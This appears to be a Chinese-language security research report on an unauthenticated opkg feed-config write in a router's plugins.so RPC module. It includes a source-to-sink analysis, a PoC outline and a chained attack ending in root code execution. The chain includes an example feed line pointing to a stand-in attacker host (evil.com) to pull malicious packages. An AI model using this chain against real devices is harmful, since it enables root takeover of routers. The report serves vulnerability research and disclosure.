# 漏洞：plugins.set_config 无认证插件源配置写入

> 本报告对应 `exp/poc12_plugins_set_config_glc_write.py`。当前结论是：这是一个无认证的 root 配置写入原语，PoC 主要证明 `/etc/opkg/customfeeds.conf` 可被外部改写；它本身不是直接 RCE，但可作为后续恶意 feed、opkg 更新/安装链路的入口。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed（无认证配置写入 / Feed Hijack 原语） |
| **认证要求** | 无需认证；直接访问 `/cgi-bin/glc` |
| **攻击面** | `/cgi-bin/glc` → `plugins.so` → `set_config` |
| **影响** | 劫持 opkg feed、污染插件仓库来源、为后续恶意包安装或持久化创造条件 |
| **根因** | `source[].name` 与 `source[].url` 未做有效白名单/字符过滤，直接写入 opkg feed 配置 |
| **PoC** | `exp/poc12_plugins_set_config_glc_write.py` |

---

## 二、攻击链总览

```text
Attacker
  -> POST /cgi-bin/glc {object="plugins", method="set_config"}
  -> plugins.so 解析 args.source[]
  -> 拼接 src/gz <name> <url> 行
  -> fopen("/etc/opkg/customfeeds.conf", "w")
  -> fwrite/fputs 写入攻击者控制的 feed 源
  -> 后续 update_repository / install_package 可被组合利用
```

---

## 三、Source → Sink 分析

### 1. Source

入口是 `/cgi-bin/glc` 的 JSON body，关键字段为 `args.source` 数组，每个元素包含 `name` 与 `url`。PoC 先调用 `plugins.get_config` 读取现有源，再追加 `repo-name/repo-url` 后回写。

### 2. Validation

当前链路中没有看到针对 `name` 或 `url` 的安全约束：没有 URL scheme 白名单、没有域名白名单、没有对空格/换行/特殊字符进行严格拒绝，也没有认证层阻断。结构上只要能被插件解析为 source 列表，就会进入写文件逻辑。

### 3. Transform

插件将每个 source 条目格式化为 opkg feed 行，例如 `src/gz codexproof http://127.0.0.1/codexproof`。该转换没有把输入作为数据对象单独保存，而是直接生成配置文本。

### 4. Sink

最终 sink 是 root 权限进程对 `/etc/opkg/customfeeds.conf` 的打开与覆盖写入。该 sink 是文件写入，不是 shell 执行；但它改变了后续包管理器信任的仓库来源。

### 5. 权限边界

`/cgi-bin/glc` 可直接加载原生 `.so` RPC 插件，外部请求无需 GL `/rpc` 登录态即可到达 `plugins.set_config`。写入发生在设备侧 root 权限上下文。

---

## 四、PoC 说明

PoC 默认注入 `codexproof -> http://127.0.0.1/codexproof`：

1. 调用 `plugins.get_config` 获取原始 feed 列表；
2. 将攻击者指定的 feed 追加到列表；
3. 调用 `plugins.set_config` 写回；
4. 再次调用 `plugins.get_config` 验证注入项存在；
5. 默认会恢复原始配置，`--keep` 可保留注入项用于人工复核。

---

## 五、关键证据

- `vulnerability_traces.md` 中 N5 条目记录了 `plugins.set_config -> /etc/opkg/customfeeds.conf` 的 Source→Sink。
- `exp/poc12_plugins_set_config_glc_write.py` 已实现 get/set/verify/restore 闭环。
- 风险点不是单次命令执行，而是 feed 劫持后与 `update_repository`、`install_package` 的组合利用。

---

## 六、plugins.so 二进制验证

对 `/usr/lib/oui-httpd/rpc/plugins.so` 进行 Ghidra 分析，确认 `set_config` 存在两个关键 sink：

### 6.1 写入 opkg feed 配置

通过 strings 提取确认关键命令模板：
```
update_repository
system
%s install %s >> /tmp/opkg.stdout 2>>/tmp/opkg.stderr;sync
opkg update 2>/dev/null;cat /etc/backup/installed_packages.txt | xargs opkg install
```

### 6.2 组合利用链

虽然 `set_config` 本身只是文件写入（非直接 RCE），但它与同模块的其他方法组合可形成完整攻击链：

```text
[1] plugins.set_config
    → 写入恶意 opkg feed 到 /etc/opkg/customfeeds.conf
    → src/gz attacker http://evil.com/packages

[2] plugins.update_repository
    → system("opkg update 2>/dev/null;...")
    → 从恶意 feed 下载包列表

[3] plugins.install_package
    → system("opkg install <malicious_package>")
    → 恶意包的 preinst/postinst 脚本以 root 执行
```

### 6.3 plugins.so 函数全景

| 函数 | 类型 | 认证 | 风险 |
|------|------|------|------|
| `get_config` | 读 UCI | 无 | - |
| **`set_config`** | 写文件 | 无 | ⚠️ Feed劫持原语 |
| **`update_repository`** | `system()` | 无 | ✅ 间接利用 |
| **`install_package`** | `system()` cmd拼接 | 无 | ✅ **直接RCE** |
| **`remove_package`** | `system()` cmd拼接 | 无 | ✅ **直接RCE** |
| `get_package_info` | 读 | 无 | - |
| `count_installed` | 读 | 无 | - |

---

## 八、双重验证确认

**plugins.so strings 验证**：确认 `%s install %s` 和 `%s remove %s` 命令模板，以及 `fork_exec`、`system`、`getShellCommandReturnDynamic` 导入。

**r2 验证**：`remove_package` @ 0x4848 (26块/1068B) — 与 Ghidra 完全一致。

**组合利用链验证**：
- `set_config` → 写入 `/etc/opkg/customfeeds.conf`（文件写入原语）
- `update_repository` → `system("opkg update")`（从恶意 feed 拉取）
- `install_package` / `remove_package` → `system("opkg install/remove %s")`（RCE）

三层方法均可通过 `/cgi-bin/glc` 无认证访问。

---

## 九、手工复核建议

建议人工补充两点：一是确认 `plugins.so` 对 `source[].name/url` 的真实解析边界；二是继续追 `update_repository` 与 `install_package`，判断恶意 feed 是否能稳定转换为插件安装执行链。
